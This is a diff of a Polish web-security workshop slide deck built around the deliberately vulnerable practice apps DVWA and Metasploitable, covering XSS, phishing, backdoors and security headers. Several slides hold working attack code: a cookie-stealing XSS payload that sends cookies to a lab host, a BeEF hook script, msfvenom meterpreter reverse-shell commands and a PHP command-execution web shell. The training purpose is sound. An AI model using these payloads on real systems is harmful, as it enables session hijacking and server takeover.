@@ -56,9 +56,9 @@
 			<div class="slides">
 				
 					<section data-background="pictures/tlo_1.jpg" data-state="dimbg">
-						<h2>Hackowanie aplikacji webowej na żywo – ataki phishingowe i backdoory</h2>
+						<h2>Praktyczne sposoby wykrywania podatności w aplikacjach webowych – ataki XSS, phishing i backdoory</h2>
 						<p>
-							<h3>Testaton 2020 - 28.03.2020</h3>
+							<h3>Marzec 2021</h3>
 						</p>
 						<p style="text-align:right"><a href="http://www.linkedin.com/in/klara-trzcinska">Klara Trzcińska</a></p>
 					</section>
@@ -70,35 +70,19 @@
 					
 					<section>
 						<h3>O mnie</h3>
-						<p>Jestem specjalistką ds. zapewnienia jakości i bezpieczeństwa oprogramowania z doświadczeniem w <b>testach bezpieczeństwa aplikacji webowych</b> oraz infrastruktury, testach wydajnościowych oraz testach technicznych. Pracuję jako Główny Specjalista w firmie Pentacomp Systemy Informatyczne, gdzie nie tylko wykonuje testy, ale także koordynuje pracę zespołu.
-						Moim głownym zainteresowaniem są testy bezpieczeństwa aplikacji webowych.</p>
-					</section>
-					
-					<section>
-						<h3>O Pentacomp</h3>
-						<p>Jesteśmy niezależnym producentem rozwiązań informatycznych i dostawcą profesjonalnych usług IT dla klientów z wybranych branż gospodarki i sektora publicznego. Dysponujemy wieloletnim doświadczeniem w realizacji strategicznych projektów dla największych w Polsce organizacji.</p>				
-						<img height="200" data-src="pictures/PC_Logo_www.jpg" alt="Pentacomp" style="border:none; box-shadow:none;">
-					</section>
-					
-					<section>
-						<h3>O Women in Technology</h3>
-						<p>Jesteśmy społecznością kobiet skupionych wokół IT i nowych technologii, zarówno ekspertek zajmujących stanowiska seniorskie, jak i osób rozwijających swoje umiejętności. Tworzymy przestrzeń sprzyjającą wymianie wiedzy i wspierającą rozwój.</p>
-						<img height="200" data-src="pictures/nowe_logo_WiT-02.png" alt="Women in Technology" style="border:none; box-shadow:none; background-color:white;">
+						<p>Jestem specjalistką ds. zapewnienia jakości i bezpieczeństwa oprogramowania z doświadczeniem w testach bezpieczeństwa aplikacji webowych oraz infrastruktury, testach wydajnościowych oraz testach technicznych.</p>
 					</section>
 					
 					<section>
                         <h3>Kwestie organizacyjne</h3>
                         <ul>
-                            <li>Jeśli nikt nie ma nic przeciwko, zwracajmy się na "Ty".</li>
-                            <li>Co około 90 minut zrobimy 10-minutową przerwę.</li>
-                            <li>Pytania zadawajcie na bieżąco.</li>
+                            <li>Warsztaty w godz. 10:00 - 14:00.</li>
+							<li>Jeśli nikt nie ma nic przeciwko, zwracajmy się na "Ty".</li>
+							<li>Teoria + zadania praktyczne.</li>
+							<li>2-3 przerwy po 10 min.</li>
+							<li>Pytania zadawajcie na bieżąco.</li>
                         </ul>
-                    </section>
-					
-					<section>
-						<h3>O was</h3>
-						<p><iframe src="https://docs.google.com/forms/d/e/1FAIpQLSe0Ik4v9iShWYoR0O22dFEitX88GiNQaTNvQ3lWXDMIPI5Utg/viewform?embedded=true" style='height:100%;width:100%' width="640" height="1770" frameborder="0" marginheight="0" marginwidth="0">Ładuję…</iframe></p>
-					</section>	
+                    </section>	
 					
 					<section>
                         <h3>Code of Ethics</h3>
@@ -117,7 +101,7 @@
 					<h3>Agenda (I)</h3>
 						<ul>
 							<li>Wprowadzenie i statystyki dotyczące podatności</li>
-							<li>Aplikacje testowe - BadStore i DVWA</li>
+							<li>Aplikacja testowa - Metasploitable i DVWA</li>
 							<li>Narzędzia typu lokalnego Proxy</li>
 							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
 							<li>XSS metody ochrony i przykłady</li>
@@ -144,12 +128,23 @@
 						<small>
 						<a href="https://www.commonplaces.com/blog/6-common-website-security-vulnerabilities/">Most Common Website Security Vulnerabilities</a>
 						</small>
-					</section>				
+					</section>
 					
 					<section>
-						<h3>Statystyki 2014 - 2018 - raport Imperva</h3>
-						<img height="360" data-src="pictures/statistics2018.png" alt="Statystyki Imperva">
-						<p>Statystyki podatności w latach 2014 - 2018 według <a href="https://www.imperva.com/blog/the-state-of-web-application-vulnerabilities-in-2018/">raportu</a> Imperva</p>
+						<h3>Statystyki Acunetix - marzec 2019 - luty 2020</h3>
+						<img height="360" data-src="pictures/stats.png" alt="Statystyki Acunetix">
+						<p>Statystyki podatności w latach 2019 - 2020 według <a href="https://www.acunetix.com/acunetix-web-application-vulnerability-report/">raportu</a> Acunetix</p>
+					</section>
+					
+					<section>
+					<h3>Projekty OWASP</h3>
+						<ul>
+							<li>OWASP Top 10</li>
+							<li>OWASP Testing Guide</li>
+							<li>OWASP Cheat Sheet Series</li>
+							<li>OWASP Application Security Verification Standard (ASVS)</li>
+							<li>OWASP Top 10 Proactive Controls</li>
+						</ul>
 					</section>
 					
 					<section>
@@ -162,11 +157,9 @@
                     </section>
 					
 					<section>
-                        <h3>Test penetracyjny</h3>
+                        <h3>Motywacja</h3>
                         <ul>
-                            <li>Kontrolowany atak na system teleinformatyczny.</li>
-							<li>Umożliwia praktyczną ocenę stanu bezpieczeństwa.</li>
-							<li>Pentester wciela się w rolę potencjalnego włamywacza.</li>
+                            <li>Pierwszym etapem podczas wdrażania w testy bezpieczeństwa jest poznanie metod HTTP m. in. GET/POST oraz zdobycie świadomości możliwości obejścia walidacji po stronie serwera.</li>
                         </ul>
                     </section>
 				</section>
@@ -178,37 +171,20 @@
 					</section>
 					
 					<section>
-						<h3>BadStore - aplikacja do ćwiczeń</h3>
-						<img height="350" data-src="pictures/BadStore.png" alt="Burp Suite">
-						<p>Aplikacja dosyć stara, pierwsze wydanie 2004 rok ale nadal opisywana na blogach, posiada praktycznie wszystkie najważniejsze podatności.</p>
+						<h3>Metasploitable</h3>
+						<p><i>Metasploitable3 is a free virtual machine that allows you to simulate attacks largely using Metasploit. It has been used by people in the security industry for a variety of reasons: such as training for network exploitation, exploit development, software testing (…).</i></p>
 					</section>
 				
 					<section>
 						<h3>DVWA - aplikacja do ćwiczeń</h3>
 						<img height="400" data-src="pictures/dvwa.png" alt="DVWA">
-						<p>Pierwsze wydanie 2008, aplikacja webowa napisana w PHP/MySQL.</p>
+						<p>Aplikacja webowa napisana w PHP/MySQL.</p>
 					</section>
 					
 					<section>
 						<h3>DVWA - zmiana poziomu zabezpieczeń</h3>
 						<img height="500" data-src="pictures/dvwa_sec.png" alt="DVWA Security level">
-					</section>
-					
-					<section>
-						<h3><a href="https://hub.docker.com/r/jvhoof/badstore-docker/">Docker BadStore</a></h3>
-						<pre><code class="html" data-trim contenteditable>
-						docker pull jvhoof/badstore-docker
-						docker run -d -p 80:80 jvhoof/badstore-docker
-						</code></pre>
-					</section>
-					
-					<section>
-						<h3><a href="https://hub.docker.com/r/vulnerables/web-dvwa/">Docker DVWA</a></h3>
-						<pre><code class="html" data-trim contenteditable>
-						docker pull vulnerables/web-dvwa
-						docker run --rm -it -p 8080:80 vulnerables/web-dvwa
-						</code></pre>
-					</section>		
+					</section>	
 				</section>
 				
 				<section>
@@ -259,7 +235,7 @@
 				<section>
 					<section>
 						<h2>Ćwiczenie 1</h2>
-						<p style="text-align: left;">Konfiguracja lokalnego Proxy i przechwytywanie żądań do aplikacji BadStore i DVWA.</p>
+						<p style="text-align: left;">Konfiguracja lokalnego Proxy i przechwytywanie żądań do aplikacji DVWA.</p>
 					</section>
 				</section>
 				
@@ -286,13 +262,18 @@
 					</section>
 					
 					<section>
+						<h3>Cross-Site Scripting - XSS</h3>
+						<img height="338" data-src="pictures/komiks_xss.png" alt="Komiks XSS">
+					</section>
+					
+					<section>
 						<h3>Stored XSS</h3>
-						<img height="338" data-src="pictures/Obraz1.png" alt="Regular expression">
+						<img height="338" data-src="pictures/Obraz1.png" alt="Stored XSS">
 					</section>
 					
 					<section>
 						<h3>Reflected XSS</h3>
-						<img height="338" data-src="pictures/Obraz2.png" alt="Regular expression">
+						<img height="338" data-src="pictures/Obraz2.png" alt="Reflected XSS">
 					</section>
 					
 					<section>
@@ -321,10 +302,9 @@
 					<section>
 						<h2>Ćwiczenie 2</h2>
 						<ul>
-								<li>Znalezienie w aplikacji BadStore podatność XSS Reflected,</li>
-								<li>Znalezienie w aplikacji BadStore podatność XSS Stored,</li>
-								<li>Wykorzystać podatność XSS do przesłania identyfikatora sesji,</li>
-								<li>Podmiana identyfikatora sesji i przejęcie sesji innego użytkownika.</li>
+								<li>Znalezienie w aplikacji podatność XSS Reflected,</li>
+								<li>Znalezienie w aplikacji podatność XSS Stored,</li>
+								<li>Wykorzystać podatność XSS do przesłania identyfikatora sesji.</li>
 						</ul>
 					</section>
 					
@@ -343,7 +323,7 @@
 					<section>
 						<h3>Kradzież plików cookie</h3>
 						<pre><code class="hljs" data-trim contenteditable>
-						&lt;script&gt;location.href = 'http://192.168.1.14:9000/Stealer.php?cookie='+document.cookie;&lt;/script&gt;
+						&lt;script&gt;location.href = 'http://10.0.2.15:9000/Stealer.php?cookie='+document.cookie;&lt;/script&gt;
 						</code></pre>
 					</section>
 				</section>
@@ -361,14 +341,14 @@
 					<section>
 						<h3>Browser Exploitation Framework - BeEF (II)</h3>
 						<pre><code class="hljs" data-trim contenteditable>
-							&lt;script src="http://192.168.1.14:3000/hook.js">&lt;/script&gt;
+							&lt;script src="http://10.0.2.15:3000/hook.js">&lt;/script&gt;
 						</code></pre>
 					</section>
 					
 					<section>
 						<h3>Browser Exploitation Framework - BeEF (III)</h3>
 						Panel logowania:
-						<a href="http://192.168.1.14:3000/ui/authentication">http://192.168.1.14:3000/ui/authentication</a>
+						<a href="http://10.0.2.15:3000/ui/authentication">http://10.0.2.15:3000/ui/authentication</a>
 						Użytkownik testowy beef/beef<br>
 						Uwaga!
 						Możliwa jest tylko jedna aktywna sesja użytkownika beef.
@@ -430,28 +410,6 @@
 						</ul>
 					</section>
 					
-					<section>
-						<h3>Przykładowy podatny kod</h3>
-						Fragment kodu odpowiadający za dodawanie danych (aplikacja .NET):
-						<pre><code class="hljs" data-trim contenteditable>
-						foreach (var item in currentRow)
-						{
-							cleanedRows.Add(StringHelper.CleanSpaces(item.Value));
-						}
-						</code></pre>
-					</section>
-					
-					<section>
-						<h3>Przykładowy poprawiony kod</h3>
-						Podatność można usunąć w następujący sposób:
-						<pre><code class="hljs" data-trim contenteditable>
-						foreach (var item in currentRow)
-						{
-							cleanedRows.Add(AntiXssEncoder.HtmlEncode(StringHelper.CleanSpaces(item.Value), false));
-						}
-						</code></pre>
-						Metoda AntiXssEncoder.HtmlEncode odpowiada za encodowanie wprowadzonych znaków. Od wersji .NET 4.5 moduł anty-XSS jest wbudowaną częścią frameworku. Dla wcześniejszych wersji konieczne było pobranie odpowiedniej biblioteki.
-					</section>
 					
 					<section>
 						<h3>Content Security Policy</h3>
@@ -537,18 +495,6 @@
 							<li>Błędy w implementacji powodowały że przez # zastępowany był fragment tagu HTML, payload nie był zmieniany, a modyfikacja innego elementu strony np. zamknięcia tagu style umożliwiała wykonanie ataku z wykorzystaniem składni CSS.</li>
 						</ul>
 						<a href="https://www.slideshare.net/masatokinugawa/xxn-en">Prezentacja na temat podatności</a>
-					</section>
-				</section>
-				
-				<section>
-					<section>
-						<h2>Ćwiczenie 4</h2>
-						<ul>
-								<li>Opracowanie przykładowego scenariusza ataku z wykorzystaniem podatności XSS.</li>
-								<li>Przygotowanie fałszywego okna logowania do innego systemu.</li>
-						</ul>
-						<br><br>
-						Podpowiedź: <a href="https://resources.infosecinstitute.com/deadly-consequences-xss/">https://resources.infosecinstitute.com/deadly-consequences-xss/</a>
 					</section>
 				</section>
 				
@@ -657,6 +603,15 @@
 					
 					<section>
 						<h3>Vulnerability - Exploit - Payload</h3>
+						<ul>
+							<li>Podatność - słabość oprogramowania, która może doprowadzić do utraty lub naruszenia zasobów</li>
+							<li>Payload - część oprogramowania, która wykonuje szkodliwe działanie</li>
+							<li>Exploit - program mający na celu wykorzystanie błędu programistycznego w celu przejęcia kontroli nad oprogramowaniem</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Vulnerability - Exploit - Payload</h3>
 						<img src="https://i.stack.imgur.com/2mykq.png">
 					</section>
 					
@@ -723,7 +678,7 @@
 					<section>
 						<h3>Msfvenom - generowanie payloadu</h3>						
 						<pre><code class="hljs" data-trim contenteditable>
-						msfvenom -p php/meterpreter/reverse_tcp lhost=127.0.0.1 lport=11000 -f raw	
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.0.2.15 lport=11000 -f raw	
 						</code></pre>
 					</section>
 					
@@ -742,7 +697,7 @@
 						<pre><code class="hljs" data-trim contenteditable>
 						msf > use multi/handler
 						msf exploit(handler) > set payload php/meterpreter/reverse_tcp
-						msf exploit(handler) > set lhost 127.0.0.1
+						msf exploit(handler) > set lhost 10.0.2.15
 						msf exploit(handler) > set lport 11000
 						msf exploit(handler) > run
 						meterpreter > sysinfo
@@ -759,8 +714,8 @@
 								<li>Wgranie do aplikacji.</li>
 								<li>Przejęcie kontroli nad serwerem (multi/handler).
 						</ul>
-						<br><br>
-						Podpowiedź: <a href="https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/">https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/</a>
+						<!--<br><br>
+						Podpowiedź: <a href="https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/">https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/</a>-->
 					</section>
 				</section>
 					
@@ -772,7 +727,7 @@
 						<?php if(isset($_REQUEST['cmd'])){ echo "&gt;pre>"; $cmd = ($_REQUEST['cmd']);
 						system($cmd); echo "&gt;/pre>"; die; } ?>
 						</code></pre>
-						<br>
+					<br>
 						Podpowiedź: <a href="https://nfsec.pl/pentest/6209">https://nfsec.pl/pentest/6209</a>
 					</section>
 				</section>
@@ -780,7 +735,7 @@
 				<section>
 					<section>
 						<h2>Ankieta</h2>
-						<a href="https://forms.gle/egnVrg2dmdCHmhGr7">https://forms.gle/egnVrg2dmdCHmhGr7</a>
+						<a href="http://bit.ly/38XEnuy">http://bit.ly/38XEnuy</a>
 					</section>
 				</section>
 				
@@ -826,7 +781,6 @@
 							<li>X-XSS-Protection,</li>
 							<li>HTTP Strict Transport Security (HSTS).</li>
 						</ul>
-						<a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project">Projekt OWASP Secure Headers</a>
 					</section>
 					
 					<section>
@@ -834,7 +788,6 @@
 						<ul>
 							<li>Nagłówek zabezpiecza przed atakami typu Clickjacking.</li>
 							<li>Najczęściej w miejscu wskazanym użytkownikowi do kliknięcia znajduje się niewidoczna ramka &lt;iframe&gt;, która przechwytuje kliknięcia, które wykonują pewną akcję w podatnej aplikacji.</li>
-							<li><a href="https://sekurak.pl/clickjacking-i-dwie-kropki-opis-bledu-w-facebooku/">Przyklad podatności - Sekurak.</a></li>
 						</ul>
 					</section>
 					
@@ -850,7 +803,7 @@
 				<section>
 					<section>
 						<h2>Ćwiczenie 6</h2>
-						<p style="text-align: left;">Weryfikacja obecności nagłowków bezpieczeństwa w aplikacji BadStore oraz wybranej innej np. Facebook.</p>					
+						<p style="text-align: left;">Weryfikacja obecności nagłowków bezpieczeństwa w aplikacji DVWA oraz wybranej innej np. Facebook.</p>					
 					</section>
 				</section>
 				
